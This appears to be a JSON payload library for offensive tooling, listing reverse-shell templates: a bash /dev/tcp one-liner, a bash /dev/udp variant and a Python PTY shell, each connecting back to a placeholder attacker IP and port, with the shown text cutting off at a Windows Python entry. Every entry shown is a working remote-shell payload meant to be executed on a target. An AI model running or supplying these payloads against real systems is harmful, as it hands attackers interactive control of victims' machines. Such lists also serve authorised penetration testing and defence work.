{
  "bash_tcp": {
    "name": "Bash TCP Reverse Shell",
    "description": "Standard bash reverse shell using /dev/tcp",
    "code": "bash -i >& /dev/tcp/{{ATTACKER_IP}}/{{ATTACKER_PORT}} 0>&1",
    "usage": "Execute on target system",
    "variables": ["ATTACKER_IP", "ATTACKER_PORT"],
    "os": "linux",
    "requirements": ["bash", "/dev/tcp support"]
  },
  
  "bash_udp": {
    "name": "Bash UDP Reverse Shell",
    "description": "UDP-based bash reverse shell",
    "code": "bash -i >& /dev/udp/{{ATTACKER_IP}}/{{ATTACKER_PORT}} 0>&1",
    "usage": "Execute on target system with nc -ulp PORT",
    "variables": ["ATTACKER_IP", "ATTACKER_PORT"],
    "os": "linux"
  },
  
  "python_pty": {
    "name": "Python PTY Reverse Shell",
    "description": "Full PTY shell with Python",
    "code": "python3 -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{{ATTACKER_IP}}\",{{ATTACKER_PORT}}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'",
    "usage": "Spawns interactive bash shell",
    "variables": ["ATTACKER_IP", "ATTACKER_PORT"],
    "os": "linux",
    "requirements": ["python3"]
  },
  
  "python_windows": {
    "name": "Python Windows Reverse Shell",
